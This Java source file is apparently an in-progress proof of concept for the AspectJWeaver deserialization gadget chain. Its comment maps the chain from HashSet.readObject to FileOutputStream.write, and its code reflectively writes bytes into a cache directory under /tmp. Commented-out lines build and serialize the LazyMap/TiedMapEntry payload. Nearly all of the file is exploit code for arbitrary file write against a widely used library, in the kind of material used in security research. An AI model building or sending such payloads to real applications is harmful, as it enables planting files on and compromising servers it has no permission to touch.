package Seri;

import org.aspectj.weaver.tools.cache.SimpleCache;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class AspectJWeaver {
    /**
     * Gadget chain:
     * HashSet.readObject()
     *     HashMap.put()
     *         HashMap.hash()
     *             TiedMapEntry.hashCode()
     *                 TiedMapEntry.getValue()
     *                     LazyMap.get()
     *                         SimpleCache$StorableCachingMap.put()
     *                             SimpleCache$StorableCachingMap.writeToPath()
     *                                 FileOutputStream.write()
     * @param args
     */
    public static void main(String[] args) throws Exception {
        String Hello = "Hello";
        byte[] bytes = Hello.getBytes();
//
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = clazz.getDeclaredConstructor(String.class ,int.class);
        constructor.setAccessible(true);
        HashMap simpleCache = (HashMap) constructor.newInstance("/tmp" ,60000);

        Class clazz2 = SimpleCache.class;
        Constructor constructor1 = clazz2.getDeclaredConstructor(String.class ,boolean.class);
        constructor1.setAccessible(true);
        SimpleCache simpleCache1 = (SimpleCache) constructor1.newInstance("/tmp" ,true);
        Field field = clazz2.getDeclaredField("cacheMap");
        field.setAccessible(true);
        Map map = (Map) field.get(simpleCache1);
        map.put("测试" ,bytes);


//        ConstantTransformer constantTransformer = new ConstantTransformer(bytes);
//        Map lazyMap = LazyMap.decorate(simpleCache ,constantTransformer);
//
//        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap ,"Filename");
//
//        HashMap hashMap = new HashMap();
//        hashMap.put(tiedMapEntry ,null);
//
//        Utils.serialize(hashMap ,"bin/AspectJWeaver.bin");
//        Utils.unserialize("bin/AspectJWeaver.bin");
//        simpleCache.put("Hello" ,new byte[]{} ,bytes);
//        LazyMap

//        LazyMap
//        TiedMapEntry tiedMapEntry = new TiedMapEntry(simpleCache, "y4shin");
//
//        HashMap hashMap = new HashMap();
//        hashMap.put()



    }
}
